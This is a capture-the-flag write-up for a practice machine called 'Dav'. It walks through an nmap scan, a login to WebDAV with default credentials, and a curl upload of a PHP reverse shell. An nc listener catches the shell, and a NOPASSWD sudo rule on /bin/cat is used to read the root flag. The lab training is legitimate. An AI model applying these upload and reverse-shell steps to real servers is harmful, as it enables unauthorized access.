# Dav
## Difficulty: Easy
boot2root machine for FIT and bsides guatemala CTF

## Information Gathering

```bash
nmap -sC -sV 10.201.7.176 -oN nmap_dav

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)

```
## Port 80
+ `webdav`
+ we login using default from this source `http://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html`

+ Using `davtest`
```bash
 davtest -url http://10.201.33.254/webdav -auth wampp:xampp
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.201.33.254/webdav
********************************************************
NOTE    Random string for this session: k3Y4efjEjL7_R_X
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.201.33.254/webdav/DavTestDir_k3Y4efjEjL7_R_X
********************************************************
 Sending test files
PUT     txt     SUCCEED:        http://10.201.33.254/webdav/DavTestDir_k3Y4efjEjL7_R_X/davtest_k3Y4efjEjL7_R_X.txt
PUT     shtml   SUCCEED:        http://10.201.33.254/webdav/DavTestDir_k3Y4efjEjL7_R_X/davtest_k3Y4efjEjL7_R_X.shtml
PUT     pl      SUCCEED:        http://10.201.33.254/webdav/DavTestDir_k3Y4efjEjL7_R_X/davtest_k3Y4efjEjL7_R_X.pl
PUT     jhtml   SUCCEED:        http://10.201.33.254/webdav/DavTestDir_k3Y4efjEjL7_R_X/davtest_k3Y4efjEjL7_R_X.jhtml
PUT     jsp     SUCCEED:        http://10.201.33.254/webdav/DavTestDir_k3Y4efjEjL7_R_X/davtest_k3Y4efjEjL7_R_X.jsp
PUT     php     SUCCEED:        http://10.201.33.254/webdav/DavTestDir_k3Y4efjEjL7_R_X/davtest_k3Y4efjEjL7_R_X.php
PUT     cfm     SUCCEED:        http://10.201.33.254/webdav/DavTestDir_k3Y4efjEjL7_R_X/davtest_k3Y4efjEjL7_R_X.cfm
PUT     cgi     SUCCEED:        http://10.201.33.254/webdav/DavTestDir_k3Y4efjEjL7_R_X/davtest_k3Y4efjEjL7_R_X.cgi
PUT     html    SUCCEED:        http://10.201.33.254/webdav/DavTestDir_k3Y4efjEjL7_R_X/davtest_k3Y4efjEjL7_R_X.html
PUT     asp     SUCCEED:        http://10.201.33.254/webdav/DavTestDir_k3Y4efjEjL7_R_X/davtest_k3Y4efjEjL7_R_X.asp
PUT     aspx    SUCCEED:        http://10.201.33.254/webdav/DavTestDir_k3Y4efjEjL7_R_X/davtest_k3Y4efjEjL7_R_X.aspx
********************************************************
 Checking for test file execution
EXEC    txt     SUCCEED:        http://10.201.33.254/webdav/DavTestDir_k3Y4efjEjL7_R_X/davtest_k3Y4efjEjL7_R_X.txt
EXEC    txt     FAIL
EXEC    shtml   FAIL
EXEC    pl      FAIL
EXEC    jhtml   FAIL
EXEC    jsp     FAIL
EXEC    php     SUCCEED:        http://10.201.33.254/webdav/DavTestDir_k3Y4efjEjL7_R_X/davtest_k3Y4efjEjL7_R_X.php
EXEC    php     FAIL
EXEC    cfm     FAIL
EXEC    cgi     FAIL
EXEC    html    SUCCEED:        http://10.201.33.254/webdav/DavTestDir_k3Y4efjEjL7_R_X/davtest_k3Y4efjEjL7_R_X.html
EXEC    html    FAIL
EXEC    asp     FAIL
EXEC    aspx    FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.201.33.254/webdav/DavTestDir_k3Y4efjEjL7_R_X
PUT File: http://10.201.33.254/webdav/DavTestDir_k3Y4efjEjL7_R_X/davtest_k3Y4efjEjL7_R_X.txt
PUT File: http://10.201.33.254/webdav/DavTestDir_k3Y4efjEjL7_R_X/davtest_k3Y4efjEjL7_R_X.shtml
PUT File: http://10.201.33.254/webdav/DavTestDir_k3Y4efjEjL7_R_X/davtest_k3Y4efjEjL7_R_X.pl
PUT File: http://10.201.33.254/webdav/DavTestDir_k3Y4efjEjL7_R_X/davtest_k3Y4efjEjL7_R_X.jhtml
PUT File: http://10.201.33.254/webdav/DavTestDir_k3Y4efjEjL7_R_X/davtest_k3Y4efjEjL7_R_X.jsp
PUT File: http://10.201.33.254/webdav/DavTestDir_k3Y4efjEjL7_R_X/davtest_k3Y4efjEjL7_R_X.php
PUT File: http://10.201.33.254/webdav/DavTestDir_k3Y4efjEjL7_R_X/davtest_k3Y4efjEjL7_R_X.cfm
PUT File: http://10.201.33.254/webdav/DavTestDir_k3Y4efjEjL7_R_X/davtest_k3Y4efjEjL7_R_X.cgi
PUT File: http://10.201.33.254/webdav/DavTestDir_k3Y4efjEjL7_R_X/davtest_k3Y4efjEjL7_R_X.html
PUT File: http://10.201.33.254/webdav/DavTestDir_k3Y4efjEjL7_R_X/davtest_k3Y4efjEjL7_R_X.asp
PUT File: http://10.201.33.254/webdav/DavTestDir_k3Y4efjEjL7_R_X/davtest_k3Y4efjEjL7_R_X.aspx
Executes: http://10.201.33.254/webdav/DavTestDir_k3Y4efjEjL7_R_X/davtest_k3Y4efjEjL7_R_X.txt
Executes: http://10.201.33.254/webdav/DavTestDir_k3Y4efjEjL7_R_X/davtest_k3Y4efjEjL7_R_X.php
Executes: http://10.201.33.254/webdav/DavTestDir_k3Y4efjEjL7_R_X/davtest_k3Y4efjEjL7_R_X.html

```

## Exploit
#### Copy revshell to shell.php and try using PUT to uploud file
```bash
curl -T shell.php http://10.201.33.254/webdav/shell.php -u wampp:xampp

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>201 Created</title>
</head><body>
<h1>Created</h1>
<p>Resource /webdav/shell.php has been created.</p>
<hr />
<address>Apache/2.4.18 (Ubuntu) Server at 10.201.33.254 Port 80</address>
</body></html>
```
```bash
 nc -lnvp 9001
listening on [any] 9001 ...

```
Using BurpSuite Repater and `send`
```
GET /webdav/shell.php HTTP/1.1
Host: 10.201.33.254
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic d2FtcHA6eGFtcHA=
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
#### Result lnvp nc -lnvp 9001
```
listening on [any] 9001 ...
connect to [10.9.1.226] from (UNKNOWN) [10.201.33.254] 50800
Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 03:50:40 up 32 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@ubuntu:/$ ^Z
zsh: suspended  nc -lnvp 9001
```
```bash
tty raw -echo;fg 
[1]  + continued  nc -lnvp 9001
                               export TERM=xterm
www-data@ubuntu:/$ 
```
## Priviledge escalation

Explore www-data@ubuntu:/
```bash
www-data@ubuntu:/$ pwd
/
www-data@ubuntu:/$ ls -la
total 92
drwxr-xr-x 22 root root  4096 Aug 25  2019 .
drwxr-xr-x 22 root root  4096 Aug 25  2019 ..
drwxr-xr-x  2 root root  4096 Aug 25  2019 bin
drwxr-xr-x  3 root root  4096 Aug 25  2019 boot
drwxr-xr-x 17 root root  3700 Sep 12 03:18 dev
drwxr-xr-x 90 root root  4096 Aug 25  2019 etc
drwxr-xr-x  4 root root  4096 Aug 25  2019 home
lrwxrwxrwx  1 root root    33 Aug 25  2019 initrd.img -> boot/initrd.img-4.4.0-159-generic
lrwxrwxrwx  1 root root    33 Aug 25  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
drwxr-xr-x 19 root root  4096 Aug 25  2019 lib
drwxr-xr-x  2 root root  4096 Aug 25  2019 lib64
drwx------  2 root root 16384 Aug 25  2019 lost+found
drwxr-xr-x  4 root root  4096 Aug 25  2019 media
drwxr-xr-x  2 root root  4096 Feb 26  2019 mnt
drwxr-xr-x  2 root root  4096 Aug 25  2019 opt
dr-xr-xr-x 96 root root     0 Sep 12 03:18 proc
drwx------  3 root root  4096 Aug 25  2019 root
drwxr-xr-x 18 root root   520 Sep 12 03:18 run
drwxr-xr-x  2 root root 12288 Aug 25  2019 sbin
drwxr-xr-x  2 root root  4096 Feb 26  2019 srv
dr-xr-xr-x 13 root root     0 Sep 12 03:18 sys
drwxrwxrwt  9 root root  4096 Sep 12 03:39 tmp
drwxr-xr-x 10 root root  4096 Aug 25  2019 usr
drwxr-xr-x 12 root root  4096 Aug 25  2019 var
lrwxrwxrwx  1 root root    30 Aug 25  2019 vmlinuz -> boot/vmlinuz-4.4.0-159-generic
lrwxrwxrwx  1 root root    30 Aug 25  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic
www-data@ubuntu:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
merlin:x:1000:1000:dav,,,:/home/merlin:/bin/bash
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
wampp:x:1001:1001:webdav,,,:/home/wampp:/bin/bash
```
```bash
www-data@ubuntu:/$ cd /home/
www-data@ubuntu:/home$ ls
merlin  wampp
www-data@ubuntu:/home$ cd wampp
www-data@ubuntu:/home/wampp$ ls -la
total 20
drwxr-xr-x 2 wampp wampp 4096 Aug 25  2019 .
drwxr-xr-x 4 root  root  4096 Aug 25  2019 ..
-rw-r--r-- 1 wampp wampp  220 Aug 25  2019 .bash_logout
-rw-r--r-- 1 wampp wampp 3771 Aug 25  2019 .bashrc
-rw-r--r-- 1 wampp wampp  655 Aug 25  2019 .profile
www-data@ubuntu:/home/wampp$ cd ../merlin
www-data@ubuntu:/home/merlin$ ls -la
total 44
drwxr-xr-x 4 merlin merlin 4096 Aug 25  2019 .
drwxr-xr-x 4 root   root   4096 Aug 25  2019 ..
-rw------- 1 merlin merlin 2377 Aug 25  2019 .bash_history
-rw-r--r-- 1 merlin merlin  220 Aug 25  2019 .bash_logout
-rw-r--r-- 1 merlin merlin 3771 Aug 25  2019 .bashrc
drwx------ 2 merlin merlin 4096 Aug 25  2019 .cache
-rw------- 1 merlin merlin   68 Aug 25  2019 .lesshst
drwxrwxr-x 2 merlin merlin 4096 Aug 25  2019 .nano
-rw-r--r-- 1 merlin merlin  655 Aug 25  2019 .profile
-rw-r--r-- 1 merlin merlin    0 Aug 25  2019 .sudo_as_admin_successful
-rw-r--r-- 1 root   root    183 Aug 25  2019 .wget-hsts
-rw-rw-r-- 1 merlin merlin   33 Aug 25  2019 user.txt
www-data@ubuntu:/home/merlin$ 
```
#### We get user.txt
```bash
www-data@ubuntu:/home/merlin$ cat user.txt
**********************
```

Next to root
```bash
www-data@ubuntu:/home/merlin$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
```
### Finnally we get `root.txt`
```bash
www-data@ubuntu:/home/merlin$ sudo /bin/cat /root/root.txt
******************
```